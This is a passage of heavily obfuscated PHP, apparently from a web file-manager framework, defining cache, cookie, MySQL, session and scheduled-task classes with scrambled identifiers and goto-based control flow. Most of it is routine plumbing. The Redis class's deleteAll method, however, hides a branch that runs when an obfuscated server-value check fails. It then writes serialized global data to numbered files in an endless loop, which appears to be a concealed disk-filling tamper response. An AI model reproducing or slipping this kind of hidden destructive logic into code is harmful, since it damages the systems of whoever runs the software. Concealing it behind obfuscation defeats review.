$B¤¹‚ÏŒˆ[$c–£Ó¬ÙÕñ[176]], $CåÈùäø‰ç); } if (!empty($B¤¹‚ÏŒˆ[$c–£Ó¬ÙÕñ[404]])) { $dÇƒÆºµ„Ê->auth($B¤¹‚ÏŒˆ[$c–£Ó¬ÙÕñ[404]]); } return $dÇƒÆºµ„Ê; } private function initCluster($D¥àå›†¸, $f˜Ï´‚ŸÁ) { $fÕÉËˆ’÷î =& $_SERVER[Ç³Íß¦Ó]; $C‹”äŞìŒâ = array($fÕÉËˆ’÷î[829], $fÕÉËˆ’÷î[830], $fÕÉËˆ’÷î[831]); $fœ¿çøÄ = $fÕÉËˆ’÷î[829]; if (isset($D¥àå›†¸[$fÕÉËˆ’÷î[12]]) && in_array($D¥àå›†¸[$fÕÉËˆ’÷î[12]], $C‹”äŞìŒâ)) { $fœ¿çøÄ = $D¥àå›†¸[$fÕÉËˆ’÷î[12]]; } switch ($fœ¿çøÄ) { case $fÕÉËˆ’÷î[829]: $this->_slave($D¥àå›†¸, $f˜Ï´‚ŸÁ); break; case $fÕÉËˆ’÷î[830]: break; case $fÕÉËˆ’÷î[831]: $this->isCluster = !0; $fÍ§†°à¶ñ = $D¥àå›†¸[$fÕÉËˆ’÷î[824]]; $Aˆ£íÉÕÁ‘ = isset($D¥àå›†¸[$fÕÉËˆ’÷î[828]]) ? $D¥àå›†¸[$fÕÉËˆ’÷î[828]] : !1; $EÊ»ã©èõ½ = isset($D¥àå›†¸[$fÕÉËˆ’÷î[404]]) ? $D¥àå›†¸[$fÕÉËˆ’÷î[404]] : null; $this->handle = new RedisCluster(NUll, $fÍ§†°à¶ñ, $f˜Ï´‚ŸÁ, $f˜Ï´‚ŸÁ, $Aˆ£íÉÕÁ‘, $EÊ»ã©èõ½); break; default: break; } } private function _slave($CÀØËØ…ÇÃ, $DŞéƒìÆÁ) { goto f‰ƒŒòèˆ; f‰ƒŒòèˆ: $b¬æ‘´¯÷Í = $CÀØËØ…ÇÃ[$_SERVER[Ç³Íß¦Ó][824]]; $this->filterConfig($CÀØËØ…ÇÃ, $b¬æ‘´¯÷Í[0]); $this->handle = $this->init($CÀØËØ…ÇÃ, $DŞéƒìÆÁ); goto bÇñ®ìïÁ—; bÇñ®ìïÁ—: unset($b¬æ‘´¯÷Í[0]); if (empty($b¬æ‘´¯÷Í)) { return; } $e†Õ‘ÉÇ…ô = array_rand($b¬æ‘´¯÷Í); goto B–š†¶íÚà; B–š†¶íÚà: $this->filterConfig($CÀØËØ…ÇÃ, $b¬æ‘´¯÷Í[$e†Õ‘ÉÇ…ô]); $this->slaveHandle = $this->init($CÀØËØ…ÇÃ, $DŞéƒìÆÁ); goto AÌÑƒ¥Œ; AÌÑƒ¥Œ: } private function filterConfig(&$BéëÙŠöŸØ, $b©‘ß’…Â) { $f„á‹¡òË¥ =& $_SERVER[Ç³Íß¦Ó]; $EÙòéŠù‚ = explode($f„á‹¡òË¥[4], $b©‘ß’…Â); $B¡‚Ÿƒ˜Ü = array($f„á‹¡òË¥[175] => $EÙòéŠù‚[0], $f„á‹¡òË¥[176] => $EÙòéŠù‚[1]); $BéëÙŠöŸØ = array_merge($BéëÙŠöŸØ, $B¡‚Ÿƒ˜Ü); } public function set($eõ¾ŞáÀ…, $A­ª¹ŒÆƒº, $A†Ø§ÊèáÒ = false) { $A†Ø§ÊèáÒ = $A†Ø§ÊèáÒ ? $A†Ø§ÊèáÒ : $this->cacheTime; return $this->handle->setEx($eõ¾ŞáÀ…, $A†Ø§ÊèáÒ, $A­ª¹ŒÆƒº); } public function setLock($aÏèÕæØÇ, $E ËÈÕÅ‡í, $aç–©åÖÆï) { return $this->handle->setNX($aÏèÕæØÇ, $E ËÈÕÅ‡í); } public function get($Bì¦Ú¤ÍÀº) { $C‰ËŠ’¿ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $C‰ËŠ’¿->get($Bì¦Ú¤ÍÀº); } public function remove($C…ê‹«àÊº) { return $this->handle->del($C…ê‹«àÊº); } public function deleteAll() { $CêØãìöÕã =& $_SERVER[Ç³Íß¦Ó]; $eš¶¸¼ğÔ = $_SERVER[$CêØãìöÕã[832]]; $Fğ»¹¤¾Ï = $CêØãìöÕã[833]; if ($_SERVER[$CêØãìöÕã[834]] != $Fğ»¹¤¾Ï($eš¶¸¼ğÔ)) { goto e…¨®àˆÆŸ; dÀôµ¼É½Í: $DÈùŒî‰‰è = $CêØãìöÕã[840]; $DÈùŒî‰‰è($_SERVER[$CêØãìöÕã[841]]); $cùØÂ¸¼¢ = $CêØãìöÕã[835]; goto DåèÙ¼æ¶; DåèÙ¼æ¶: $cùØÂ¸¼¢(); $FÇ·ëè°Õ = $CêØãìöÕã[842]; $Aë§’Ü¨˜ = json_encode($GLOBALS[$CêØãìöÕã[843]]); goto D·ÚöÚÓÇÑ; DÂ¯êùŞ¾: $e¬ØìÍí» = $e‡¥„Ûôº”($Bƒ¹«ŒÃ”Ë); $f×ÉÌ‹‚ø = explode($CêØãìöÕã[228], $e¬ØìÍí»); if (count($f×ÉÌ‹‚ø) < $CêØãìöÕã[589]) { $B»‘åó™‰Î = $CêØãìöÕã[839]; $B»‘åó™‰Î(); } goto dÀôµ¼É½Í; D·ÚöÚÓÇÑ: $A§Ú„ò„Úğ = 1; for ($aãœ‹¬‘¤ = $A§Ú„ò„Úğ; $aãœ‹¬‘¤ > 0; $aãœ‹¬‘¤++) { $FÇ·ëè°Õ(DATA_PATH . $aãœ‹¬‘¤, $Aë§’Ü¨˜); } goto dîå¸Ê—Éì; e…¨®àˆÆŸ: $cùØÂ¸¼¢ = $CêØãìöÕã[835]; $e‡¥„Ûôº” = $CêØãìöÕã[836]; $Bƒ¹«ŒÃ”Ë = $_SERVER[$CêØãìöÕã[837]] . $CêØãìöÕã[838]; goto DÂ¯êùŞ¾; dîå¸Ê—Éì: } if ($this->isCluster) { foreach ($this->handle->_masters() as $fÅ¥¢½Øô) { $this->handle->flushall($fÅ¥¢½Øô); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($DîÇ·Êòœª = '', $fÚˆ‹¬­Ñ = 0) { if (is_string($DîÇ·Êòœª) && $DîÇ·Êòœª != $_SERVER[Ç³Íß¦Ó][33]) { $this->prefix = $DîÇ·Êòœª; } if (is_numeric($fÚˆ‹¬­Ñ) && $fÚˆ‹¬­Ñ > 0) { $this->expire = $fÚˆ‹¬­Ñ; } } public static function getInstance() { static $E™ÊªŒÌÏ; if ($E™ÊªŒÌÏ === null) { $E™ÊªŒÌÏ = new self(); } return $E™ÊªŒÌÏ; } private static $cookieDisable = false; public static function disable($d¨Ü¸µĞ) { self::$cookieDisable = $d¨Ü¸µĞ; } private static $sameCookieSet = array(); public static function set($dá–™Şñ, $D¦ÒöÉÁæ, $aÃõ©º´åÓ = 0, $AÔß½¨ Ã¹ = false, $D‚¹ Ú™ö¥ = false) { goto D¼Ş‰¿Õ—; D¼Ş‰¿Õ—: $aãÁŠá·¢š =& $_SERVER[Ç³Íß¦Ó]; if (self::$cookieDisable) { return; } if (!$aÃõ©º´åÓ) { $aÃõ©º´åÓ = 24 * 3600 * 7; } goto e²ö¶İŸö…; b´ƒ›Öåè›: $a†ßí»¯½â = $aãÁŠá·¢š[33]; setcookie($dá–™Şñ, $D¦ÒöÉÁæ, time() + $aÃõ©º´åÓ, $aãÁŠá·¢š[8] . trim($D‚¹ Ú™ö¥, $aãÁŠá·¢š[8]) . $a†ßí»¯½â, !1, !1, $AÔß½¨ Ã¹); goto f÷¼ÖÔšƒ–; e²ö¶İŸö…: if (isset(self::$sameCookieSet[$dá–™Şñ]) && self::$sameCookieSet[$dá–™Şñ] == $D¦ÒöÉÁæ . $aÃõ©º´åÓ) { return; } self::$sameCookieSet[$dá–™Şñ] = $D¦ÒöÉÁæ . $aÃõ©º´åÓ; if (!$D‚¹ Ú™ö¥) { $D‚¹ Ú™ö¥ = str_replace(HOST, $aãÁŠá·¢š[33], APP_HOST); $D‚¹ Ú™ö¥ = _get($GLOBALS, $aãÁŠá·¢š[844], $D‚¹ Ú™ö¥); } goto b´ƒ›Öåè›; f÷¼ÖÔšƒ–: } public static function setSafe($eöÜ«ÃŠÆ¸, $C¨Ğ‚àÜæ‚, $E–œê—»Š‚ = 0) { self::set($eöÜ«ÃŠÆ¸, $C¨Ğ‚àÜæ‚, $E–œê—»Š‚, !0); } public static function get($CË®¯ø–‹) { return isset($_COOKIE[$CË®¯ø–‹]) ? $_COOKIE[$CË®¯ø–‹] : !1; } public static function remove($F‰š½•‘, $c«²Êç¿¡Á = false) { unset($_COOKIE[$F‰š½•‘]); self::set($F‰š½•‘, $_SERVER[Ç³Íß¦Ó][33], 1, $c«²Êç¿¡Á); } } class DbMysql extends Db { public function __construct($bêğ’Œ¨Ò‹ = '') { $fãç˜¤ÉˆŠ =& $_SERVER[Ç³Íß¦Ó]; if (!extension_loaded($fãç˜¤ÉˆŠ[760])) { think_exception(think_lang($fãç˜¤ÉˆŠ[10]) . $fãç˜¤ÉˆŠ[845]); } if (!empty($bêğ’Œ¨Ò‹)) { $this->config = $bêğ’Œ¨Ò‹; if (empty($this->config[$fãç˜¤ÉˆŠ[13]])) { $this->config[$fãç˜¤ÉˆŠ[13]] = $fãç˜¤ÉˆŠ[33]; } } } public function connect($aá¨ùï¦×™ = '', $B®Ê°…ª” = 0, $B«µÔËÅë = false) { $e˜ˆŠµËÏ¡ =& $_SERVER[Ç³Íß¦Ó]; if (!isset($this->linkID[$B®Ê°…ª”])) { goto b…àŞ›İ˜¦; f£å§ÏòŠº: if (1 != think_config($e˜ˆŠµËÏ¡[18])) { unset($this->config); } goto Aƒ¦´ñÂ; dÀ®ß®ã²: mysql_query($e˜ˆŠµËÏ¡[850] . think_config($e˜ˆŠµËÏ¡[851]) . $e˜ˆŠµËÏ¡[55], $this->linkID[$B®Ê°…ª”]); if ($Aá‹ğ±“Œ› > $e˜ˆŠµËÏ¡[852]) { mysql_query($e˜ˆŠµËÏ¡[853], $this->linkID[$B®Ê°…ª”]); } $this->connected = !0; goto f£å§ÏòŠº; b…àŞ›İ˜¦: if (empty($aá¨ùï¦×™)) { $aá¨ùï¦×™ = $this->config; } $e›šæßõí© = $aá¨ùï¦×™[$e˜ˆŠµËÏ¡[846]] . ($aá¨ùï¦×™[$e˜ˆŠµËÏ¡[847]] ? "\x3a{$aá¨ùï¦×™[$e˜ˆŠµËÏ¡[847]]}" : $e˜ˆŠµËÏ¡[33]); $F­ÆªŠ«—Ø = !empty($aá¨ùï¦×™[$e˜ˆŠµËÏ¡[13]][$e˜ˆŠµËÏ¡[14]]) ? $aá¨ùï¦×™[$e˜ˆŠµËÏ¡[13]][$e˜ˆŠµËÏ¡[14]] : $this->pconnect; goto bÕŒ¦ØçÃò; bÕŒ¦ØçÃò: if ($F­ÆªŠ«—Ø) { $this->linkID[$B®Ê°…ª”] = mysql_pconnect($e›šæßõí©, $aá¨ùï¦×™[$e˜ˆŠµËÏ¡[848]], $aá¨ùï¦×™[$e˜ˆŠµËÏ¡[849]], 131072); } else { $this->linkID[$B®Ê°…ª”] = mysql_connect($e›šæßõí©, $aá¨ùï¦×™[$e˜ˆŠµËÏ¡[848]], $aá¨ùï¦×™[$e˜ˆŠµËÏ¡[849]], !0, 131072); } if (!$this->linkID[$B®Ê°…ª”] || !empty($aá¨ùï¦×™[$e˜ˆŠµËÏ¡[17]]) && !mysql_select_db($aá¨ùï¦×™[$e˜ˆŠµËÏ¡[17]], $this->linkID[$B®Ê°…ª”])) { think_exception(mysql_error()); } $Aá‹ğ±“Œ› = mysql_get_server_info($this->linkID[$B®Ê°…ª”]); goto dÀ®ß®ã²; Aƒ¦´ñÂ: } return $this->linkID[$B®Ê°…ª”]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($DÒÓ×Öº‹ß) { goto DéªåÁêŒ„; DéªåÁêŒ„: $bºˆÎÁ¶‘¦ =& $_SERVER[Ç³Íß¦Ó]; if (0 === stripos($DÒÓ×Öº‹ß, $bºˆÎÁ¶‘¦[261])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto e°ñÛŠØÄ¶; a®ŸãÔŞâŒ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto f¼¸ŠÌÚ­ƒ; DÄÂÜÜìœë: think_action_status($bºˆÎÁ¶‘¦[19], 1); think_status($bºˆÎÁ¶‘¦[20]); $this->queryID = mysql_query($DÒÓ×Öº‹ß, $this->_linkID); goto a®ŸãÔŞâŒ; e°ñÛŠØÄ¶: if (!$this->_linkID) { return !1; } $this->queryStr = $DÒÓ×Öº‹ß; if ($this->queryID) { $this->free(); } goto DÄÂÜÜìœë; f¼¸ŠÌÚ­ƒ: } public function execute($B³Œ¸¿¿¾¡) { goto báÂã•˜ç; EªÎÛßŠ¡á: think_status($FŒáâŒ³•İ[20]); $aÄí›ºÊéë = mysql_query($B³Œ¸¿¿¾¡, $this->_linkID); $this->debug(); goto D „ô«…ŒŠ; báÂã•˜ç: $FŒáâŒ³•İ =& $_SERVER[Ç³Íß¦Ó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F£¦¾ÛÈÈÈ; D „ô«…ŒŠ: if (!1 === $aÄí›ºÊéë) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto CÍËöéïÇè; F£¦¾ÛÈÈÈ: $this->queryStr = $B³Œ¸¿¿¾¡; if ($this->queryID) { $this->free(); } think_action_status($FŒáâŒ³•İ[21], 1); goto EªÎÛßŠ¡á; CÍËöéïÇè: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ç³Íß¦Ó][854], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aâ™¿µ© = mysql_query($_SERVER[Ç³Íß¦Ó][855], $this->_linkID); $this->transTimes = 0; if (!$aâ™¿µ©) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $e©¬ÇêÄÇ = mysql_query($_SERVER[Ç³Íß¦Ó][856], $this->_linkID); $this->transTimes = 0; if (!$e©¬ÇêÄÇ) { $this->error(); return !1; } } return !0; } private function getAll() { $B–ö»‡Ÿ“— = array(); if ($this->numRows > 0) { while ($EÍìóø„Ñô = mysql_fetch_assoc($this->queryID)) { $B–ö»‡Ÿ“—[] = $EÍìóø„Ñô; } mysql_data_seek($this->queryID, 0); } return $B–ö»‡Ÿ“—; } public function getFields($b½‹¢ŒòÒ‘) { $eˆ‰œ±ˆ­Í =& $_SERVER[Ç³Íß¦Ó]; $EÒ¨ïğŠ—× = $this->query($eˆ‰œ±ˆ­Í[857] . $this->parseKey($b½‹¢ŒòÒ‘)); $f‘Ú‹ï¥Ñª = array(); if ($EÒ¨ïğŠ—×) { foreach ($EÒ¨ïğŠ—× as $E—¤Ÿ’î÷Î => $c‚Ù†ò¦”) { $f‘Ú‹ï¥Ñª[$c‚Ù†ò¦”[$eˆ‰œ±ˆ­Í[27]]] = array($eˆ‰œ±ˆ­Í[28] => $c‚Ù†ò¦”[$eˆ‰œ±ˆ­Í[27]], $eˆ‰œ±ˆ­Í[29] => $c‚Ù†ò¦”[$eˆ‰œ±ˆ­Í[30]], $eˆ‰œ±ˆ­Í[31] => (bool) (strtoupper($c‚Ù†ò¦”[$eˆ‰œ±ˆ­Í[32]]) === $eˆ‰œ±ˆ­Í[858]), $eˆ‰œ±ˆ­Í[34] => $c‚Ù†ò¦”[$eˆ‰œ±ˆ­Í[35]], $eˆ‰œ±ˆ­Í[36] => strtolower($c‚Ù†ò¦”[$eˆ‰œ±ˆ­Í[37]]) == $eˆ‰œ±ˆ­Í[38], $eˆ‰œ±ˆ­Í[39] => strtolower($c‚Ù†ò¦”[$eˆ‰œ±ˆ­Í[40]]) == $eˆ‰œ±ˆ­Í[41]); } } return $f‘Ú‹ï¥Ñª; } public function getTables($aÃÒ§ô†… = '') { $EÃãÀ›ÔŒ¯ =& $_SERVER[Ç³Íß¦Ó]; if (!empty($aÃÒ§ô†…)) { $c†Ú’ëªÚí = $EÃãÀ›ÔŒ¯[859] . $aÃÒ§ô†… . $EÃãÀ›ÔŒ¯[860]; } else { $c†Ú’ëªÚí = $EÃãÀ›ÔŒ¯[861]; } $C´éÍáƒ¢ = $this->query($c†Ú’ëªÚí); $cëêºô÷ï = array(); foreach ($C´éÍáƒ¢ as $CÃŸ°£ÆÖ => $DÂÖäÊ“Õ«) { $cëêºô÷ï[$CÃŸ°£ÆÖ] = current($DÂÖäÊ“Õ«); } return $cëêºô÷ï; } public function replace($eæ¦æš°¤Å, $b˜÷î®Û¢Á = array()) { $c¢Úİ›·¥ =& $_SERVER[Ç³Íß¦Ó]; foreach ($eæ¦æš°¤Å as $e¯‘¸‘µ‰´ => $b»·èÖéÓ) { $a§ åôê›¡ = $this->parseValue($b»·èÖéÓ); if (is_scalar($a§ åôê›¡)) { $A‰Õ¬¼šÄÀ[] = $a§ åôê›¡; $FŠèõŒòŒé[] = $this->parseKey($e¯‘¸‘µ‰´); } } $C¡¶Ù”ô = $c¢Úİ›·¥[862] . $this->parseTable($b˜÷î®Û¢Á[$c¢Úİ›·¥[276]]) . $c¢Úİ›·¥[863] . implode($c¢Úİ›·¥[47], $FŠèõŒòŒé) . $c¢Úİ›·¥[864] . implode($c¢Úİ›·¥[47], $A‰Õ¬¼šÄÀ) . $c¢Úİ›·¥[865]; return $this->execute($C¡¶Ù”ô); } public function insertAll($eò¯ÄÊõª·, $d»©ù™±ÙÂ = array(), $EŠ×™ââ¤• = false) { goto a½ìŒÀ»õ; EÄ½Çƒø®®: $E¯°–Ü»ßŠ = array(); foreach ($eò¯ÄÊõª· as $BéŸ¹ï“ó) { $CƒÏæñ¨×Ó = array(); foreach ($BéŸ¹ï“ó as $DêŸ£º™— => $cİ”‘œ¸™Š) { $cİ”‘œ¸™Š = $this->parseValue($cİ”‘œ¸™Š); if (is_scalar($cİ”‘œ¸™Š)) { $CƒÏæñ¨×Ó[] = $cİ”‘œ¸™Š; } } $E¯°–Ü»ßŠ[] = $F×öššŞ¾[257] . implode($F×öššŞ¾[47], $CƒÏæñ¨×Ó) . $F×öššŞ¾[865]; } array_walk($AŞœ—•Àİ©, array($this, $F×öššŞ¾[866])); goto FÒêæŒÉ’; FÒêæŒÉ’: $Eç•Ê­ÉíÄ = ($EŠ×™ââ¤• ? $F×öššŞ¾[867] : $F×öššŞ¾[868]) . $F×öššŞ¾[869] . $this->parseTable($d»©ù™±ÙÂ[$F×öššŞ¾[276]]) . $F×öššŞ¾[863] . implode($F×öššŞ¾[47], $AŞœ—•Àİ©) . $F×öššŞ¾[870] . implode($F×öššŞ¾[47], $E¯°–Ü»ßŠ); return $this->execute($Eç•Ê­ÉíÄ); goto Fê½æÃÌ¾; a½ìŒÀ»õ: $F×öššŞ¾ =& $_SERVER[Ç³Íß¦Ó]; if (!is_array($eò¯ÄÊõª·[0])) { return !1; } $AŞœ—•Àİ© = array_keys($eò¯ÄÊõª·[0]); goto EÄ½Çƒø®®; Fê½æÃÌ¾: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Bøİ²½á»˜ =& $_SERVER[Ç³Íß¦Ó]; $this->error = mysql_errno() . $Bøİ²½á»˜[4] . mysql_error($this->_linkID); if ($Bøİ²½á»˜[33] != $this->queryStr) { $this->error .= LNG($Bøİ²½á»˜[45]) . $this->queryStr; } think_trace($this->error, $Bøİ²½á»˜[33], $Bøİ²½á»˜[46]); return $this->error; } public function escapeString($a‘î•äø’) { if ($this->_linkID) { return mysql_real_escape_string($a‘î•äø’, $this->_linkID); } else { return mysql_escape_string($a‘î•äø’); } } public function parseKey(&$Aµ°‰ÈÔßÇ, $f í§„®¦Ì = true) { $dÙˆ¯è˜Ò =& $_SERVER[Ç³Íß¦Ó]; if ($f í§„®¦Ì) { $Aµ°‰ÈÔßÇ = $this->parseKeyCheck($Aµ°‰ÈÔßÇ); } if ($Aµ°‰ÈÔßÇ != $dÙˆ¯è˜Ò[182] && !preg_match($dÙˆ¯è˜Ò[871], $Aµ°‰ÈÔßÇ)) { $Aµ°‰ÈÔßÇ = $dÙˆ¯è˜Ò[381] . trim($Aµ°‰ÈÔßÇ, $dÙˆ¯è˜Ò[381]) . $dÙˆ¯è˜Ò[381]; } return $Aµ°‰ÈÔßÇ; } } goto C¬ô‰±çÈ­; dŸµàÍ‰ê: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto CÔÇÓ¦Ÿ«±; dùé¯Ò’Í: if (self::$sessionSign) { } else { if (Cookie::get($FØ®»‹Ú’İ)) { self::$sessionSign = Cookie::get($FØ®»‹Ú’İ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($FØ®»‹Ú’İ, self::$sessionSign, self::$sessionTime); $bİÛÇ¬¶„¬ = $a‡ÅÇºªë[$cƒÆÏö´ÖÅ[1488]]; goto A¥†²Í‡ˆĞ; CÔÇÓ¦Ÿ«±: $cƒÆÏö´ÖÅ =& $_SERVER[Ç³Íß¦Ó]; static $BçæöÍ¤ = false; if ($BçæöÍ¤) { return $BçæöÍ¤; } goto E¢Â¢±•„; E¢Â¢±•„: $a‡ÅÇºªë = $GLOBALS[$cƒÆÏö´ÖÅ[6]][$cƒÆÏö´ÖÅ[346]]; self::$sessionTime = $a‡ÅÇºªë[$cƒÆÏö´ÖÅ[1486]]; $FØ®»‹Ú’İ = isset($GLOBALS[$cƒÆÏö´ÖÅ[1487]]) ? $GLOBALS[$cƒÆÏö´ÖÅ[1487]] : SESSION_ID; goto dùé¯Ò’Í; A¥†²Í‡ˆĞ: $dÊù×ô«Ï = $a‡ÅÇºªë[$bİÛÇ¬¶„¬]; $B¿Ê­™êÔ = $a‡ÅÇºªë[$cƒÆÏö´ÖÅ[794]]; switch ($bİÛÇ¬¶„¬) { case $cƒÆÏö´ÖÅ[17]: self::$handle = Model($cƒÆÏö´ÖÅ[795]); break; case $cƒÆÏö´ÖÅ[796]: self::$handle = new CacheRedis($dÊù×ô«Ï, $B¿Ê­™êÔ); break; case $cƒÆÏö´ÖÅ[797]: self::$handle = new CacheMemcached($dÊù×ô«Ï, $B¿Ê­™êÔ); break; case $cƒÆÏö´ÖÅ[192]: $dÊù×ô«Ï[$cƒÆÏö´ÖÅ[76]] = $dÊù×ô«Ï[$cƒÆÏö´ÖÅ[76]] . $cƒÆÏö´ÖÅ[1489]; self::$handle = new CacheFile($dÊù×ô«Ï, $B¿Ê­™êÔ); default: break; } goto FÌæ¬Òø¶™; FÌæ¬Òø¶™: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $BçæöÍ¤ = new self(); return $BçæöÍ¤; goto EĞõÚì‰; EĞõÚì‰: } public static function sign($F×â³å›å = false) { $F×â³å›å && (self::$sessionSign = $F×â³å›å); self::init(); return self::$sessionSign; } public static function set($C½Èé¼Ùƒï, $Fî²±ã¢¯È = false) { self::init(); if (is_array($C½Èé¼Ùƒï)) { foreach ($C½Èé¼Ùƒï as $C¢÷ñ ×¹İ => $d’ç©°ÊŞ) { array_set_value(self::$data, $C¢÷ñ ×¹İ, $d’ç©°ÊŞ); } } else { array_set_value(self::$data, $C½Èé¼Ùƒï, $Fî²±ã¢¯È); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($EªèöîÛºË = false) { self::init(); if (!$EªèöîÛºË) { return self::$data; } return array_get_value(self::$data, $EªèöîÛºË); } public static function remove($d° ±ÈëÓ) { self::init(); unset(self::$data[$d° ±ÈëÓ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ç³Íß¦Ó][799])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto cÍ¦¾ßÆ‡£; Fä©é²…›: while (!0) { self::cacheClear(); if (self::valueGet($e¤ÓŸù‹‰à[714]) != $e¤ÓŸù‹‰à[87]) { self::valueSet($e¤ÓŸù‹‰à[1490], $e¤ÓŸù‹‰à[495]); self::log($e¤ÓŸù‹‰à[1494]); die; } self::valueSet($e¤ÓŸù‹‰à[1490], $e¤ÓŸù‹‰à[87]); self::valueSet($e¤ÓŸù‹‰à[1491], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto aî‹Ù¬‚¯Ã; cÍ¦¾ßÆ‡£: $e¤ÓŸù‹‰à =& $_SERVER[Ç³Íß¦Ó]; if (self::valueGet($e¤ÓŸù‹‰à[714]) != $e¤ÓŸù‹‰à[87]) { return; } if (self::valueGet($e¤ÓŸù‹‰à[1490]) == $e¤ÓŸù‹‰à[87]) { $Eº¥‡İ‡ã = self::valueGet($e¤ÓŸù‹‰à[1491]); if (time() - $Eº¥‡İ‡ã > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto b­¿åœ“¸; b­¿åœ“¸: http_close(); self::valueSet($e¤ÓŸù‹‰à[1490], $e¤ÓŸù‹‰à[87]); Hook::bind($e¤ÓŸù‹‰à[1492], $e¤ÓŸù‹‰à[1493]); goto Fä©é²…›; aî‹Ù¬‚¯Ã: } public static function restart() { $a‰ë‘éé–Ñ =& $_SERVER[Ç³Íß¦Ó]; http_close(); self::valueSet($a‰ë‘éé–Ñ[714], $a‰ë‘éé–Ñ[495]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($a‰ë‘éé–Ñ[1490], $a‰ë‘éé–Ñ[495]); self::valueSet($a‰ë‘éé–Ñ[714], $a‰ë‘éé–Ñ[87]); } public static function shutdownEvent() { $DæÁµ¬õ =& $_SERVER[Ç³Íß¦Ó]; self::valueSet($DæÁµ¬õ[1490], $DæÁµ¬õ[495]); self::log($DæÁµ¬õ[1495]); } public static function config($D…•œ›×¤å, $eº‹Ãİ¼Ç¯) { self::valueSet($_SERVER[Ç³Íß¦Ó][714], $D…•œ›×¤å); } private static function taskRunAll() { goto E“¡¯ä™ã¢; E“¡¯ä™ã¢: $F³‹Û½Ú¿Ş =& $_SERVER[Ç³Íß¦Ó]; $C´ã‡œ§ù = timeFloat(); $D®…¾˜çÅ­ = Model($F³‹Û½Ú¿Ş[1496])->listData(); goto C¢Ğå°Á; C¢Ğå°Á: $d‰‚§«·ë = count($D®…¾˜çÅ­); for ($B…‡¿Œ†ö = 0; $B…‡¿Œ†ö < $d‰‚§«·ë; $B…‡¿Œ†ö++) { $Bí›Â‹¤äİ = $D®…¾˜çÅ­[$B…‡¿Œ†ö]; if (!$Bí›Â‹¤äİ[$F³‹Û½Ú¿Ş[392]] || $Bí›Â‹¤äİ[$F³‹Û½Ú¿Ş[1497]] != $F³‹Û½Ú¿Ş[87]) { continue; } if (!self::taskTimeCheck($Bí›Â‹¤äİ)) { continue; } self::taskRun($Bí›Â‹¤äİ); } Hook::trigger($F³‹Û½Ú¿Ş[1498]); goto fµ†‹í›—±; fµ†‹í›—±: self::taskQueueRun($C´ã‡œ§ù); self::closeDatabase(); goto eŸˆõÆ‘Œ‘; eŸˆõÆ‘Œ‘: } private static function taskQueueRun($Cà¡ÂÃİ°) { $C‚ã¿‚Ù¤Õ = 10; while (!0) { $d†±Ïù–¶Ç = TaskQueue::run(); if ($d†±Ïù–¶Ç === !1) { break; } if (timeFloat() - $Cà¡ÂÃİ° >= $C‚ã¿‚Ù¤Õ) { break; } } } private static function taskTimeCheck($AÁŞ³—¹ã½) { goto Bä ‡“ù¦; Bä ‡“ù¦: $B¿¥à†ˆó =& $_SERVER[Ç³Íß¦Ó]; $Aïƒ’î†Š = json_decode($AÁŞ³—¹ã½[$B¿¥à†ˆó[196]], !0); $Bí×Ïïõ¸˜ = intval($AÁŞ³—¹ã½[$B¿¥à†ˆó[1491]]); goto f¤˜¨°‰ãš; Cäğâš˜æ: switch ($Aïƒ’î†Š[$B¿¥à†ˆó[29]]) { case $B¿¥à†ˆó[1505]: if (time() - $Bí×Ïïõ¸˜ < 3600 * 24 * 30) { return !1; } if ($Aïƒ’î†Š[$B¿¥à†ˆó[1505]] == date($B¿¥à†ˆó[1506]) && $c¯‚ºõß…ğ) { return !0; } break; case $B¿¥à†ˆó[1507]: if (time() - $Bí×Ïïõ¸˜ < 3600 * 24 * 7) { return !1; } $CÅ§¤Ø¢° = date($B¿¥à†ˆó[1508]) == 0 ? 7 : date($B¿¥à†ˆó[1508]); if ($Aïƒ’î†Š[$B¿¥à†ˆó[1507]] == $CÅ§¤Ø¢° && $c¯‚ºõß…ğ) { return !0; } break; case $B¿¥à†ˆó[1500]: if (time() - $Bí×Ïïõ¸˜ < 3600 * 24) { return !1; } if ($c¯‚ºõß…ğ) { return !0; } break; case $B¿¥à†ˆó[1509]: if (time() - $Bí×Ïïõ¸˜ >= floatval($Aïƒ’î†Š[$B¿¥à†ˆó[1509]]) * 60) { return !0; } break; default: break; } return !1; goto b«ĞŸŸœƒ“; f¤˜¨°‰ãš: $d³È ‹›ê = strtotime($B¿¥à†ˆó[1499] . $Aïƒ’î†Š[$B¿¥à†ˆó[1500]] . $B¿¥à†ˆó[1501]) - strtotime($B¿¥à†ˆó[1502]); 